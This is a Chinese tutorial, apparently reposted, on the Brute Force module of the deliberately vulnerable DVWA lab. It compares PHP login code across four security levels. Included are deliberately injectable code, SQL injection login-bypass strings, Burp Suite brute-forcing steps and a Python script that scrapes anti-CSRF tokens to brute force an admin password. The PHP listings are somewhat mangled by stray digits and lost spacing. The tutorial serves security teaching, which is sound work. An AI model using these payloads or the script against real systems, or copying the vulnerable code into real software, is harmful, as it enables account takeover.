**DVWA简介**
----------

**DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。**

DVWA共有十个模块，分别是Brute Force（暴力（破解））、Command Injection（[命令行](https://so.csdn.net/so/search?q=%E5%91%BD%E4%BB%A4%E8%A1%8C&spm=1001.2101.3001.7020)注入）、CSRF（跨站请求伪造）、File Inclusion（文件包含）、File Upload（文件上传）、Insecure CAPTCHA（不安全的验证码）、SQL Injection（SQL注入）、SQL Injection（Blind）（SQL盲注）、XSS（Reflected）（反射型跨站脚本）、XSS（Stored）（存储型跨站脚本）。

需要注意的是，DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。

**Brute Force**
---------------

Brute Force，即暴力（破解），是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一，如2014年轰动全国的12306“撞库”事件，实质就是暴力破解攻击。

[![1.jpg](http://image.3001.net/images/20161009/14760002264830.jpg!small)](http://image.3001.net/images/20161009/14760002264830.jpg)

**下面将对四种级别的代码进行分析。**

### **Low**

服务器端核心代码

```
<?php       
if(isset($_GET['Login'])){      
//Getusername      
$user=$_GET['username'];       
//Getpassword      
$pass=$_GET['password'];      
$pass=md5($pass);       1
//Checkthedatabase      1
$query="SELECT*FROM`users`WHEREuser='$user'ANDpassword='$pass';";      1
$result=mysql_query($query)ordie('<pre>'.mysql_error().'</pre>');       1
if($result&&mysql_num_rows($result)==1){      1
//Getusersdetails      1
$avatar=mysql_result($result,0,"avatar");       1
//Loginsuccessful      2
echo"<p>Welcometothepasswordprotectedarea{$user}</p>";      2
echo"<imgsrc="{$avatar}"/>";      2
}      2
else{      2
//Loginfailed      2
echo"<pre><br/>Usernameand/orpasswordincorrect.</pre>";      2
}       2
mysql_close();      2
}       3
?>
```


可以看到，服务器只是验证了参数Login是否被设置（isset函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false），没有任何的防爆破机制，且对参数username、password没有做任何过滤，存在明显的sql注入漏洞。

**漏洞利用**

**方法一爆破利用burpsuite即可完成**

第一步抓包

[![抓包](http://image.3001.net/images/20161009/14760003309956.png!small)](http://image.3001.net/images/20161009/14760003309956.png)

第二步，ctrl+I将包复制到intruder模块，因为要对password参数进行爆破，所以在password参数的内容两边加$

[![ctrl+I将包复制到intruder模块](http://image.3001.net/images/20161009/1476000296331.png!small)](http://image.3001.net/images/20161009/1476000296331.png)

第三步选中Payloads，载入字典，点击Start attack进行爆破

![选中Payloads](http://image.3001.net/images/20161009/14760003769188.png!small)![点击Start attack进行爆破](http://image.3001.net/images/20161009/1476000377570.png!small)

最后，尝试在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。

![找到正确密码](http://image.3001.net/images/20161009/14760004176934.png!small)

**方法二手工sql注入**

1. Username:admin’ or ’1′=’1  

Password:（空）

注入成功

![注入成功](http://image.3001.net/images/20161009/14760004593118.png!small)

2\. Username :admin’ #

Password :（空）

注入成功

![注入成功](http://image.3001.net/images/20161009/1476000472219.png!small)

### **Medium**

服务器端核心代码

```
<?php       
if(isset($_GET['Login'])){      
//Sanitiseusernameinput      
$user=$_GET['username'];      
$user=mysql_real_escape_string($user);       
//Sanitisepasswordinput      
$pass=$_GET['password'];      1
$pass=mysql_real_escape_string($pass);      1
$pass=md5($pass);       1
//Checkthedatabase      1
$query="SELECT*FROM`users`WHEREuser='$user'ANDpassword='$pass';";      1
$result=mysql_query($query)ordie('<pre>'.mysql_error().'</pre>');       1
if($result&&mysql_num_rows($result)==1){      1
//Getusersdetails      1
$avatar=mysql_result($result,0,"avatar");       2
//Loginsuccessful      2
echo"<p>Welcometothepasswordprotectedarea{$user}</p>";      2
echo"<imgsrc="{$avatar}"/>";      2
}      2
else{      2
//Loginfailed      2
sleep(2);      2
echo"<pre><br/>Usernameand/orpasswordincorrect.</pre>";      2
}       3
mysql_close();      3
}       3
?>
```


相比Low级别的代码，Medium级别的代码主要增加了mysql\_real\_escape\_string函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，基本上能够抵御sql注入攻击，说基本上是因为查到说 MySQL5.5.37以下版本如果设置编码为GBK，能够构造编码绕过mysql\_real\_escape\_string 对单引号的转义（因实验环境的MySQL版本较新，所以并未做相应验证）；同时，$pass做了MD5校验，杜绝了通过参数password进行sql注入的可能性。但是，依然没有加入有效的防爆破机制（sleep(2)实在算不上）。

具体的mysql\_real\_escape\_string函数绕过问题详见

[http://blog.csdn.net/hornedreaper1988/article/details/43520257](http://blog.csdn.net/hornedreaper1988/article/details/43520257)

[http://www.cnblogs.com/Safe3/archive/2008/08/22/1274095.html](http://www.cnblogs.com/Safe3/archive/2008/08/22/1274095.html)

**漏洞利用**

虽然sql注入不再有效，但依然可以使用Burpsuite进行爆破，与Low级别的爆破方法基本一样，这里就不赘述了。

### **High**

服务器端核心代码

```
<?php       
if(isset($_GET['Login'])){      
//CheckAnti-CSRFtoken      
checkToken($_REQUEST['user_token'],$_SESSION['session_token'],'index.php');       
//Sanitiseusernameinput      
$user=$_GET['username'];      
$user=stripslashes($user);      1
$user=mysql_real_escape_string($user);       1
//Sanitisepasswordinput      1
$pass=$_GET['password'];      1
$pass=stripslashes($pass);      1
$pass=mysql_real_escape_string($pass);      1
$pass=md5($pass);       1
//Checkdatabase      1
$query="SELECT*FROM`users`WHEREuser='$user'ANDpassword='$pass';";      2
$result=mysql_query($query)ordie('<pre>'.mysql_error().'</pre>');       2
if($result&&mysql_num_rows($result)==1){      2
//Getusersdetails      2
$avatar=mysql_result($result,0,"avatar");       2
//Loginsuccessful      2
echo"<p>Welcometothepasswordprotectedarea{$user}</p>";      2
echo"<imgsrc="{$avatar}"/>";      2
}      3
else{      3
//Loginfailed      3
sleep(rand(0,3));      3
echo"<pre><br/>Usernameand/orpasswordincorrect.</pre>";      3
}       3
mysql_close();      3
}       3
//GenerateAnti-CSRFtoken      4
generateSessionToken();       4
?>
```


High级别的代码加入了Token，可以抵御[CSRF](https://so.csdn.net/so/search?q=CSRF&spm=1001.2101.3001.7020)攻击，同时也增加了爆破的难度，通过抓包，可以看到，登录验证时提交了四个参数：username、password、Login以及user\_token。

![验证登录](http://image.3001.net/images/20161009/14760005155007.png!small)

每次服务器返回的登陆页面中都会包含一个随机的user\_token的值，用户每次登录时都要将user\_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。

![SQL查询](http://image.3001.net/images/20161009/1476000526224.png!small)

同时，High级别的代码中，使用了stripslashes（去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个）、 mysql\_real\_escape\_string对参数username、password进行过滤、转义，进一步抵御sql注入。

**漏洞利用**

由于加入了Anti-CSRFtoken预防无脑爆破，这里就不推荐用Burpsuite了，还是简单用python写个脚本吧。

下面是我自己写的一个脚本（python 2.7），用户名为admin，对password参数进行爆破并打印结果，仅供各位参考。

```
from bs4 import BeautifulSoup      
import urllib2      
header={        'Host': '192.168.153.130',      
		'Cache-Control': 'max-age=0',      
		'If-None-Match': "307-52156c6a290c0",      
		'If-Modified-Since': 'Mon, 05 Oct 2015 07:51:07 GMT',      
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36',      
		'Accept': '*/*',      
		'Referer': 'http://192.168.153.130/dvwa/vulnerabilities/brute/index.php',      1
		'Accept-Encoding': 'gzip, deflate, sdch',      1
		'Accept-Language': 'zh-CN,zh;q=0.8',      1
		'Cookie': 'security=high; PHPSESSID=5re92j36t4f2k1gvnqdf958bi2'}      1
requrl = "http://192.168.153.130/dvwa/vulnerabilities/brute/"       1
def get_token(requrl,header):      1
	req = urllib2.Request(url=requrl,headers=header)      1
	response = urllib2.urlopen(req)      1
	print response.getcode(),      1
	the_page = response.read()      2
	print len(the_page)      2
	soup = BeautifulSoup(the_page,"html.parser")      2
	user_token = soup.form.input.input.input.input["value"] #get the user_token      2
	return user_token       2
user_token = get_token(requrl,header)      2
i=0      2
for line in open("rkolin.txt"):      2
	requrl = "http://192.168.153.130/dvwa/vulnerabilities/brute/"+"?username=admin&password="+line.strip()+"&Login=Login&user_token="+user_token      2
	i = i+1      3
	print i,'admin',line.strip(),      3
	user_token = get_token(requrl,header)      3
	if (i == 10):      3
		break
```


get\_token的功能是通过python的BeautifulSoup库从html页面中抓取user\_token的值，为了方便展示，这里设置只尝试10次。

运行脚本时的Burpsuite截图

![Burpsuite截图](http://image.3001.net/images/20161009/14760005821969.png!small)

打印的结果从第二行开始依次是序号、用户名、密码、http状态码以及返回的页面长度。

![打印的结果](http://image.3001.net/images/20161009/14760005958917.png!small)

对比结果看到，密码为password时返回的长度不太一样，手工验证，登录成功，爆破完成。

### **Impossible**

服务器端核心代码

```
  1.  <?php       
if(isset($_POST['Login'])){      
//CheckAnti-CSRFtoken      
checkToken($_REQUEST['user_token'],$_SESSION['session_token'],'index.php');       
//Sanitiseusernameinput      
$user=$_POST['username'];      
$user=stripslashes($user);      1
$user=mysql_real_escape_string($user);       1
//Sanitisepasswordinput      1
$pass=$_POST['password'];      1
$pass=stripslashes($pass);      1
$pass=mysql_real_escape_string($pass);      1
$pass=md5($pass);       1
//Defaultvalues      1
$total_failed_login=3;      2
$lockout_time=15;      2
$account_locked=false;       2
//Checkthedatabase(Checkuserinformation)      2
$data=$db->prepare('SELECTfailed_login,last_loginFROMusersWHEREuser=(:user)LIMIT1;');      2
$data->bindParam(':user',$user,PDO::PARAM_STR);      2
$data->execute();      2
$row=$data->fetch();       2
//Checktoseeiftheuserhasbeenlockedout.      3
if(($data->rowCount()==1)&&($row['failed_login']>=$total_failed_login)){      3
//Userlockedout.Note,usingthismethodwouldallowforuserenumeration!      3
//echo"<pre><br/>Thisaccounthasbeenlockedduetotoomanyincorrectlogins.</pre>";       3
//Calculatewhentheuserwouldbeallowedtologinagain      3
$last_login=$row['last_login'];      3
$last_login=strtotime($last_login);      3
$timeout=strtotime("{$last_login}+{$lockout_time}minutes");      3
$timenow=strtotime("now");       4
//Checktoseeifenoughtimehaspassed,ifithasn'tlockedtheaccount      4
if($timenow>$timeout)      4
$account_locked=true;      4
}       4
//Checkthedatabase(ifusernamematchesthepassword)      4
$data=$db->prepare('SELECT*FROMusersWHEREuser=(:user)ANDpassword=(:password)LIMIT1;');      4
$data->bindParam(':user',$user,PDO::PARAM_STR);      4
$data->bindParam(':password',$pass,PDO::PARAM_STR);      4
$data->execute();      5
$row=$data->fetch();       5
//Ifitsavalidlogin...      5
if(($data->rowCount()==1)&&($account_locked==false)){      5
//Getusersdetails      5
$avatar=$row['avatar'];      5
$failed_login=$row['failed_login'];      5
$last_login=$row['last_login'];       5
//Loginsuccessful      6
echo"<p>Welcometothepasswordprotectedarea<em>{$user}</em></p>";      6
echo"<imgsrc="{$avatar}"/>";       6
//Hadtheaccountbeenlockedoutsincelastlogin?      6
if($failed_login>=$total_failed_login){      6
echo"<p><em>Warning</em>:Someonemightofbeenbruteforcingyouraccount.</p>";      6
echo"<p>Numberofloginattempts:<em>{$failed_login}</em>.<br/>Lastloginattemptwasat:<em>${last_login}</em>.</p>";      6
}       6
//Resetbadlogincount      7
$data=$db->prepare('UPDATEusersSETfailed_login="0"WHEREuser=(:user)LIMIT1;');      7
$data->bindParam(':user',$user,PDO::PARAM_STR);      7
$data->execute();      7
}      7
else{      7
//Loginfailed      7
sleep(rand(2,4));       7
//Givetheusersomefeedback      7
echo"<pre><br/>Usernameand/orpasswordincorrect.<br/><br/>Alternative,theaccounthasbeenlockedbecauseoftoomanyfailedlogins.<br/>Ifthisisthecase,<em>pleasetryagainin{$lockout_time}minutes</em>.</pre>";       8
//Updatebadlogincount      8
$data=$db->prepare('UPDATEusersSETfailed_login=(failed_login+1)WHEREuser=(:user)LIMIT1;');      8
$data->bindParam(':user',$user,PDO::PARAM_STR);      8
$data->execute();      8
}       8
//Setthelastlogintime      8
$data=$db->prepare('UPDATEusersSETlast_login=now()WHEREuser=(:user)LIMIT1;');      8
$data->bindParam(':user',$user,PDO::PARAM_STR);      9
$data->execute();      9
}       9
//GenerateAnti-CSRFtoken      9
generateSessionToken();       9
?>        `

**
```


可以看到Impossible级别的代码加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续。

![爆破提示](http://image.3001.net/images/20161009/1476000620885.png!small)

同时采用了更为安全的PDO（PHP Data Object）机制防御sql注入，这是因为不能使用PDO扩展本身执行任何数据库操作，而sql注入的关键就是通过破坏sql语句结构执行恶意的sql命令。

关于PDO：[http://www.cnblogs.com/pinocchioatbeijing/archive/2012/03/20/2407869.html](http://www.cnblogs.com/pinocchioatbeijing/archive/2012/03/20/2407869.html)

转自：[http://www.freebuf.com/articles/web/116437.html](http://www.freebuf.com/articles/web/116437.html)

**本文原创作者：lonehand**